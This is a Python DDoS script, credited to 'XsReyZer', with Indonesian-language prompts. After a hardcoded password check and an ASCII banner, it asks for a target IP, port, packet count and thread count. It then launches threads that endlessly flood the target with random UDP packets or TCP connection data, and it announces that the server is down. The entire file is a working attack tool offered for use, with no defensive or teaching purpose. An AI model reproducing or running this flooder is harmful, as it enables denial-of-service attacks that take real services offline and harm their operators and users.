#!/usr/bin/env python3
#Code By XsReyZer
import time
import random
import socket
import threading
import os

os.system("clear")
password ="Rey"

for i in range(3):
	pwd = input("[▪] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[▪] TUNGGU 5 DETIK!!! ")
		break
	else:
		time.sleep(5)
		print("[×] Password Salah!!! ")
		continue
time.sleep(5)
print("{√} Password Benar Silahkan Ddos")
time.sleep(5)

print("══》 Tools V1 By : XsReyZer 《══")
print("██╗░░██╗###############██")
print("╚██╗██╔╝|Autor : XsReyZer   |")
print("░╚███╔╝░|Yang Mau Rename|")
print("░██╔██╗░|Pm me !!!!     |")
print("██╔╝╚██╗|Xstyleboy Team |")
print("╚═╝░░╚═╝###############██")

ip = str(input("══》HOST/IP TARGET:"))
port = int(input("══》PORT TARGET:"))
choice = str(input("══》GASS BRO SERANG?(y/n):"))
times = int(input("══》PACKETS DDOS:"))
threads = int(input("══》THREADS DDOS:"))
def run():
	data = random._urandom(9904)
	i = random.choice(("[&]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Paket Reyzer!!!")
		except:
			print("[!] Down server nya!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[&]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Paket Reyzer!!!")
		except:
			s.close()
			print("[*] Down server nya")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()